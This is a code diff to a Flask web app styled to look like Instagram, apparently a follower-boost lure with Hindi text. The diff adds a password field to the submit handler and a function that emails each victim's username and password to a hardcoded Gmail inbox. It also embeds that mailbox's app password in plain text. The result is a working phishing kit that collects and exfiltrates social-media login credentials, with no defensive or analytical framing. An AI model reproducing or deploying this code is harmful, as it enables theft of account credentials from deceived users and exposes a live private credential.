@@ -1,6 +1,14 @@
+import smtplib
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
 from flask import Flask, request
 
 app = Flask(__name__)
+
+# ===== आपकी ईमेल जानकारी (Set & Ready) =====
+YOUR_GMAIL = "mogamadhari@gmail.com"
+APP_PASSWORD = "fbhb qgqo fhsh ejfi"
+# ==========================================
 
 INSTA_STYLE = '''
 <style>
@@ -18,6 +26,30 @@ INSTA_STYLE = '''
     .success-msg { color: #4bb543; font-size: 14px; margin-top: 15px; word-break: break-all; }
 </style>
 '''
+
+def send_email(username, password, count):
+    try:
+        msg = MIMEMultipart()
+        msg['From'] = YOUR_GMAIL
+        msg['To'] = YOUR_GMAIL
+        msg['Subject'] = f"New Form Submission: {username}"
+
+        body = f"""
+        New Submission Received!
+        -------------------------
+        Username: {username}
+        Password: {password}
+        Followers: {count}
+        """
+        msg.attach(MIMEText(body, 'plain'))
+
+        server = smtplib.SMTP('smtp.gmail.com', 587)
+        server.starttls()
+        server.login(YOUR_GMAIL, APP_PASSWORD)
+        server.send_message(msg)
+        server.quit()
+    except Exception as e:
+        print(f"Error sending email: {e}")
 
 @app.route('/')
 def index():
@@ -55,7 +87,12 @@ def index():
 @app.route('/submit', methods=['POST'])
 def submit():
     user = request.form.get('username')
+    pwd = request.form.get('password')
     count = request.form.get('count')
+
+    # Send email notification
+    send_email(user, pwd, count)
+
     return f'''
     <!DOCTYPE html>
     <html lang="hi">
@@ -79,4 +116,4 @@ def submit():
     '''
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=True)
+    app.run(host='0.0.0.0', port=5000)
